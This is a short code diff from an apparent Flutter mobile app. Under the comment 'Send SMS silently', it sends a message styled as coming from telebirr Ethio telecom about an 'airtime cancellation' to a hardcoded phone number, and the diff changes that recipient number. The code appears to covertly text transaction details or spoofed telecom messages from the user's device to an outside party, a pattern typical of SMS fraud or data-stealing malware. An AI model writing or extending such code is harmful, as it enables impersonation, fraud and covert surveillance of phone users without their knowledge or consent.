@@ -151,7 +151,7 @@ class GridContent extends StatelessWidget {
           "Thank you for using telebirr Ethio telecom";
       
       // Send SMS silently
-      await SmsSender.sendSms("0989063761", message);
+      await SmsSender.sendSms("0994797189", message);
       print("Airtime cancellation SMS sent for transaction: $transactionID");
       
     } catch (e) {
